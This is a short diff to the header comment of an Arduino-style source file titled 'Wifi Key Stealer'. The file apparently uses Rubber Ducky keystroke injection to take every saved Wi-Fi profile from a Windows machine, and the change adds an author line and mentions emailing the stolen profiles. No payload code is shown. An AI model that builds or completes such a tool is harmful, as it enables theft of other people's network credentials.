@@ -1,6 +1,7 @@
 /*
  * Title : Wifi Key Stealer 
- * Description : steal all wifi profiles from windows machine using rubber ducky key stroke injection
+ * Author:urug@blk2
+ * Description : steal all wifi profiles from windows machine and sent via email using rubber ducky key stroke injection
  */
 
 #include "Keyboard.h"
